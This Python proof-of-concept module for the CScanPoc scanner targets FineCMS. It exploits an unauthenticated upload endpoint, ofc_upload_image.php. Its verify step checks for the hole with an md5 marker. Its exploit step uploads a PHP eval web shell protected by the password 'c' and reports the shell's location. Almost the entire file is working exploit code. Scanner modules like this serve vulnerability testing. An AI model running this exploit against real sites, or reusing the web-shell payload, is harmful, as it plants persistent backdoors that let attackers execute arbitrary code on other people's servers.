# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse
import random


class Vuln(ABVuln):
    vuln_id = 'FineCMS_0012'  # 平台漏洞编号，留空
    name = 'FineCMS免费版无条件getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        路径：dayrui/libraries/Chart/ofc_upload_image.php
        无任何限制，可以直接上传。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3314/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


def verifyShell(target, fileName):
    url = target + "?name=" + fileName
    req = urllib.request.Request(
        url, headers={"Content-Type": "application/oct"})
    res = urllib.request.urlopen(req, data="<?print(md5(0x22))?>")
    return res.read()


def uploadShell(target, fileName):
    url = target + "?name=" + fileName
    req = urllib.request.Request(
        url, headers={"Content-Type": "application/oct"})
    res = urllib.request.urlopen(
        req, data="<?print(md5(0x22));<?php eval($_POST[c])?>")
    return res.read()


class Poc(ABPoc):
    poc_id = '28955efe-b474-41c6-adc1-6ce149fdc730'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            fileName = "shell" + str(random.randrange(1000, 9999)) + ".php"
            payload = "/dayrui/libraries/Chart/ofc_upload_image.php"
            target = self.target + payload
            res = verifyShell(target, fileName)

            if res.find("tmp-upload-images") == -1:
                print("Failed !")
                return

            print("upload Shell success")
            url = self.target + "/dayrui/libraries/tmp-upload-images/" + fileName
            md5 = urllib.request.urlopen(url).read()
            if md5.find("e369853df766fa44e1ed0ff613f563bd") != -1:
                # print "poc: " + url
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            fileName = "shell" + str(random.randrange(1000, 9999)) + ".php"
            payload = "/dayrui/libraries/Chart/ofc_upload_image.php"
            target = self.target + payload
            res = uploadShell(target, fileName)

            if res.find("tmp-upload-images") == -1:
                print("Failed !")
                return

            print("upload Shell success")
            url = self.target + "/dayrui/libraries/tmp-upload-images/" + fileName
            md5 = urllib.request.urlopen(url).read()
            if md5.find("e369853df766fa44e1ed0ff613f563bd") != -1:
                # print "poc: " + url
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
